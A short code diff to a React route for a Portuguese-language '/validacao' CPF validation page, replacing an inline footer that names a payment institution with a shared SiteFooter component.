@@ -3,6 +3,7 @@ import { useServerFn } from "@tanstack/react-start";
 import { useState } from "react";
 import { FunnelSteps } from "@/components/FunnelSteps";
 import { consultarCPF } from "@/lib/cpf.functions";
+import { SiteFooter } from "@/components/SiteFooter";
 
 export const Route = createFileRoute("/validacao")({
   head: () => ({
@@ -181,15 +182,7 @@ function Validacao() {
         </div>
       </main>
 
-      {/* Footer */}
-      <footer className="text-center text-xs text-gray-500 py-6 relative z-10">
-        <p>© 2025 Mercado Instituição de Pagamento Ltda.</p>
-        <p className="mt-1">
-          CNPJ: 10.573.521/0001-91 ·{" "}
-          <a href="#" className="text-gray-900">Termos e condições</a> ·{" "}
-          <a href="#" className="text-gray-900">Privacidade</a>
-        </p>
-      </footer>
+      <SiteFooter />
     </div>
   );
 }
